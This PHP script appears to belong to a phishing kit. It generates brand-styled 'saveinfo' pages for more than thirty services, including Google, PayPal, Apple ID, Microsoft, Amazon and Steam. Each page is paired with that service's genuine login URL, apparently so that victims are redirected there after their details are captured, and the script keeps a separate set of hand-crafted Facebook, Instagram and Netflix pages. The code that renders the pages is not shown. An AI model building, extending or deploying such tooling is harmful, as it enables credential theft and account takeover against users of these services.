<?php

declare(strict_types=1);

/**
 * Regenerates brand-styled saveinfo-templates/{slug}.html (not facebook, instagram,
 * linkedin, netflix, default, facebook_followers — those stay hand-crafted).
 *
 * Usage: php tools/generate_saveinfo_simple_templates.php [--force]
 */

require_once __DIR__ . '/saveinfo_skin_html.php';

$baseDir = dirname(__DIR__);
$outDir = $baseDir . '/saveinfo-templates';

$preserve = [
    'facebook.html',
    'facebook_followers.html',
    'instagram.html',
    'linkedin.html',
    'netflix.html',
    'default.html',
];

$redirects = [
    'snapchat' => 'https://www.snapchat.com/',
    'twitter' => 'https://x.com/',
    'github' => 'https://github.com/login',
    'google' => 'https://accounts.google.com/',
    'origin' => 'https://www.ea.com/',
    'yahoo' => 'https://login.yahoo.com/',
    'protonmail' => 'https://account.proton.me/login',
    'wordpress' => 'https://wordpress.com/log-in',
    'microsoft' => 'https://login.live.com/',
    'ig_followers' => 'https://www.instagram.com/',
    'pinterest' => 'https://www.pinterest.com/',
    'apple_id' => 'https://appleid.apple.com/',
    'verizon' => 'https://www.verizon.com/',
    'dropbox' => 'https://www.dropbox.com/login',
    'line' => 'https://line.me/',
    'shopify' => 'https://accounts.shopify.com/',
    'messenger' => 'https://www.messenger.com/',
    'gitlab' => 'https://gitlab.com/users/sign_in',
    'twitch' => 'https://www.twitch.tv/login',
    'myspace' => 'https://myspace.com/',
    'badoo' => 'https://badoo.com/signin',
    'vk' => 'https://vk.com/',
    'yandex' => 'https://passport.yandex.com/',
    'deviantart' => 'https://www.deviantart.com/users/login',
    'wifi' => 'https://www.google.com/',
    'paypal' => 'https://www.paypal.com/signin',
    'steam' => 'https://store.steampowered.com/login/',
    'tiktok' => 'https://www.tiktok.com/',
    'playstation' => 'https://my.playstation.com/',
    'ebay' => 'https://signin.ebay.com/',
    'amazon' => 'https://www.amazon.com/ap/signin',
    'icloud' => 'https://www.icloud.com/',
    'spotify' => 'https://accounts.spotify.com/login',
    'reddit' => 'https://www.reddit.com/login/',
    'stackoverflow' => 'https://stackoverflow.com/users/login',
    'custom' => 'https://www.google.com/',
];

$force = in_array('--force', $argv ?? [], true) || in_array('-f', $argv ?? [], true);

foreach ($redirects as $slug => $url) {
    $file = $slug . '.html';
    if (in_array($file, $preserve, true)) {
        continue;
    }
    $path = $outDir . '/' . $file;
    if (!$force && is_file($path)) {
        echo "Skip (use --force): $file\n";
        continue;
    }
    $html = saveinfo_skin_page_html($slug, $url);
    if ($html === '') {
        echo "WARN empty HTML for $slug\n";
        continue;
    }
    file_put_contents($path, $html);
    echo "Wrote $file\n";
}

echo "Done.\n";
